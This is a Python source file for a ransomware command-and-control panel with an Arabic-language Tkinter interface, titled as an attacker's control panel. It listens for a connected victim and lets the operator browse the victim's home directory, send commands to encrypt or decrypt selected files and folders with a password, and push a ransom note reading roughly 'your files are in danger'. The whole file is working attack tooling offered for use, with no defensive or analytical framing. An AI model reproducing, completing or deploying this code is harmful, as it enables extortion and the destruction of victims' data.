import socket
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, simpledialog, messagebox
import json


class AttackerC2:
    def __init__(self, host='0.0.0.0', port=9999):
        self.victim_conn = None
        self.setup_gui()

        server_thread = threading.Thread(target=self.start_server, args=(host, port))
        server_thread.daemon = True
        server_thread.start()

    def log(self, message, prefix="[*]"):
        self.log_area.config(state=tk.NORMAL)
        self.log_area.insert(tk.END, f"{prefix} {message}\n")
        self.log_area.config(state=tk.DISABLED)
        self.log_area.see(tk.END)

    def setup_gui(self):
        self.root = tk.Tk()
        self.root.title("💀 لوحة تحكم المهاجم التفاعلية (v2.1)")
        self.root.geometry("900x600")

        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        main_frame.grid_rowconfigure(0, weight=1)
        main_frame.grid_columnconfigure(0, weight=1)
        main_frame.grid_columnconfigure(1, weight=2)

        files_frame = ttk.LabelFrame(main_frame, text="متصفح ملفات الضحية")
        files_frame.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        files_frame.grid_rowconfigure(1, weight=1)
        files_frame.grid_columnconfigure(0, weight=1)

        browse_btn = ttk.Button(files_frame, text="📂 استعراض المجلد الرئيسي للضحية", command=self.browse_home_directory)
        browse_btn.grid(row=0, column=0, sticky="ew", padx=5, pady=5)

        self.file_tree = ttk.Treeview(files_frame)
        self.file_tree.grid(row=1, column=0, sticky="nsew")
        self.file_tree.heading("#0", text="مسار الملف/المجلد")
        self.file_tree.bind("<Double-1>", self.on_double_click)

        right_frame = ttk.Frame(main_frame)
        right_frame.grid(row=0, column=1, sticky="nsew", padx=5, pady=5)
        right_frame.grid_rowconfigure(1, weight=1)
        right_frame.grid_columnconfigure(0, weight=1)

        control_frame = ttk.LabelFrame(right_frame, text="لوحة التحكم")
        control_frame.grid(row=0, column=0, sticky="ew", pady=5)

        encrypt_btn = ttk.Button(control_frame, text="🔒 تشفير العنصر المحدد", command=self.encrypt_selected)
        encrypt_btn.pack(side=tk.LEFT, padx=5, pady=5)

        decrypt_btn = ttk.Button(control_frame, text="🔓 فك تشفير العنصر المحدد", command=self.decrypt_selected)
        decrypt_btn.pack(side=tk.LEFT, padx=5, pady=5)

        ransom_btn = ttk.Button(control_frame, text="❗ إرسال رسالة الفدية", command=self.send_ransom_note)
        ransom_btn.pack(side=tk.LEFT, padx=5, pady=5)

        log_frame = ttk.LabelFrame(right_frame, text="السجلات والأحداث")
        log_frame.grid(row=1, column=0, sticky="nsew", pady=5)
        log_frame.grid_rowconfigure(0, weight=1)
        log_frame.grid_columnconfigure(0, weight=1)
        self.log_area = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, state=tk.DISABLED)
        self.log_area.grid(row=0, column=0, sticky="nsew")

        self.status_bar = tk.Label(self.root, text="الحالة: في انتظار اتصال الضحية...", bd=1, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)

    def on_double_click(self, event):
        item_id = self.file_tree.identify_row(event.y)
        if not item_id: return
        item_type = self.file_tree.item(item_id, 'tags')[0]
        if item_type == 'dir':
            item_path = self.file_tree.item(item_id, 'values')[0]
            self.log(f"طلب محتويات المجلد: {item_path}")
            command = {'action': 'list_files', 'path': item_path}
            self.send_command(command)
        else:
            self.log("العنصر المحدد هو ملف، لا يمكن فتحه.", prefix="[!] ")

    def start_server(self, host, port):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, port))
        server_socket.listen(1)
        self.log(f"السيرفر يستمع على {host}:{port}")
        while True:
            conn, addr = server_socket.accept()
            self.victim_conn = conn
            self.status_bar.config(text=f"متصل بـ: {addr[0]}:{addr[1]}", bg="lightgreen")
            self.log(f"تم الاتصال من ضحية جديدة: {addr}")
            listen_thread = threading.Thread(target=self.listen_to_victim)
            listen_thread.daemon = True
            listen_thread.start()

    def listen_to_victim(self):
        buffer = ""
        while True:
            try:
                data = self.victim_conn.recv(4096).decode('utf-8')
                if not data: break
                buffer += data
                while "\n\n" in buffer:
                    message, buffer = buffer.split("\n\n", 1)
                    response = json.loads(message)
                    if response['type'] == 'file_list':
                        self.update_file_tree(response['data'])
                    elif response['type'] == 'status':
                        self.log(f"رسالة من الضحية: {response['data']}", prefix="[+]")
            except (ConnectionResetError, json.JSONDecodeError):
                break
        self.status_bar.config(text="الحالة: انقطع الاتصال", bg="lightcoral")
        self.log("انقطع الاتصال مع الضحية.", prefix="[!] ")
        self.victim_conn = None

    def send_command(self, command):
        if self.victim_conn:
            try:
                self.victim_conn.sendall((json.dumps(command) + "\n\n").encode('utf-8'))
            except Exception as e:
                self.log(f"فشل إرسال الأمر: {e}", prefix="[!] ")
        else:
            messagebox.showwarning("خطأ", "لا يوجد ضحية متصلة.")

    def browse_home_directory(self):
        self.log("إرسال أمر استعراض المجلد الرئيسي...")
        command = {'action': 'list_files', 'path': '~'}
        self.send_command(command)

    def update_file_tree(self, file_data):
        for i in self.file_tree.get_children():
            self.file_tree.delete(i)
        for item in file_data:
            icon = "📁" if item['type'] == 'dir' else "📄"
            self.file_tree.insert('', 'end', text=f" {icon} {item['name']}", values=[item['path']], tags=(item['type'],))
        self.log("تم تحديث متصفح الملفات.")

    def encrypt_selected(self):
        selected_item = self.file_tree.focus()
        if not selected_item:
            messagebox.showwarning("خطأ", "الرجاء تحديد ملف أو مجلد لتشفيره أولاً.")
            return
        item_path = self.file_tree.item(selected_item)['values'][0]
        password = simpledialog.askstring("كلمة المرور", "أدخل كلمة المرور للتشفير:", show='*')
        if not password or len(password) < 8:
            messagebox.showerror("خطأ", "كلمة المرور يجب أن تكون 8 أحرف على الأقل.")
            return
        self.log(f"إرسال أمر تشفير للمسار: {item_path}")
        command = {'action': 'encrypt', 'path': item_path, 'password': password}
        self.send_command(command)

    def decrypt_selected(self):
        selected_item = self.file_tree.focus()
        if not selected_item:
            messagebox.showwarning("خطأ", "الرجاء تحديد ملف أو مجلد لفك تشفيره.")
            return
        item_path = self.file_tree.item(selected_item)['values'][0]
        item_type = self.file_tree.item(selected_item, 'tags')[0]
        if not item_path.endswith('.locked') and item_type != 'dir':
            messagebox.showwarning("تحذير", "العنصر المحدد ليس ملفًا مشفرًا (لا ينتهي بـ .locked).")
            return
        password = simpledialog.askstring("كلمة المرور", "أدخل كلمة المرور لفك التشفير:", show='*')
        if not password:
            messagebox.showerror("خطأ", "يجب إدخال كلمة المرور.")
            return
        self.log(f"إرسال أمر فك تشفير للمسار: {item_path}")
        command = {'action': 'decrypt', 'path': item_path, 'password': password}
        self.send_command(command)

    def send_ransom_note(self):
        victim_id = simpledialog.askstring("معرف الضحية", "أدخل معرف الضحية (اختياري):")
        ransom_message = f"ملفاتك في خطر... معرف الضحية: {victim_id or 'N/A'}"
        self.log("إرسال رسالة الفدية...")
        command = {'action': 'show_note', 'message': ransom_message}
        self.send_command(command)

    def run(self):
        self.root.mainloop()


if __name__ == "__main__":
    app = AttackerC2()
    app.run()
